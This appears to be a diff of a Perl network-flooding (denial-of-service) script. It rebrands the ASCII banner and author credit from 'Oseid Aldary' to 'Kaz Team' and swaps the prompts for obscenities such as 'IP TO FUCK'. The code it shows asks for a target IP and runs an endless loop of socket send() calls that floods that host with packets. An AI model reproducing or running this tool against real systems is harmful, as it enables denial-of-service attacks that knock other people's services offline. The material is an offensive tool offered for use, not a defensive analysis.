@@ -14,17 +14,17 @@ system("cls || clear");
 print q{ 
                    .-"      "-.  
                   /            \ 
-                 |    JOKER11   | 
+                 |       | 
                  |,  .-.  .-.  ,| 
                  | )(__/  \__)( | 
                  |/     /\     \| 
        (@_       (_     ^^     _) 
   _     ) \_______\__|IIIIII|__/__________________________ 
- (_)@8@8{}<________|-\IIIIII/-|_A_N_O_N_Y_M_O_U_S_A_R_A_B_> 
+ (_)@8@8{}<________|-\IIIIII/-|_ F_u _c _k _T _h _e _m _K _a _z _z _z _> 
         )_/        \          / 
-       (@           `--------` Welcome! 
+       (@           `--------` Connect...! 
 
- [---]   by:> OSEID ALDARY   [---]
+ [---]   by:> KAZ TEAM   [---]
 };
 # Check Intenret Connection !
 my $check = IO::Socket::INET->new( 'PeerAddr'=>'www.google.com', 
@@ -39,11 +39,11 @@ if(!(defined $check && $check)){
 $check->close();
 # INPUT TARGET INFO ==============================================
 print "\n===============================";
-print "\n[~] Enter TargetIP: "; # Set Target IP
+print "\n[~] IP TO FUCK: "; # Set Target IP
 $host = <STDIN>;
 chomp ($host);
 while ($host eq ""){
- print "   [!] Enter TargetIP?: ";
+ print "   [!] IP TO FUCK?: ";
  $host = <STDIN>;
  chomp ($host);
 }
@@ -96,7 +96,7 @@ while (1) {
 
   }else{
             $size = rand() * 8921873 * 99919988;
-            print ("Flooding: (=>$host:$port~$proto<=) Packets sent: $size\n");
+            print ("FUCKING: (=>$host:$port~$proto<=) Packets sent: $size\n");
             send($sock, $size*2, $size*2); 
             send($sock, $size*3, $size*3);
             send($sock, $size*4, $size*4);
@@ -110,6 +110,6 @@ $sock->close()
 #####################  END OF SCRIPT #########################
 #####################                #########################
 ##############################################################
-#This Script by Oseid Aldary
+#This Script by Kaz Team
 #Have a nice day :)
 #GoodBye
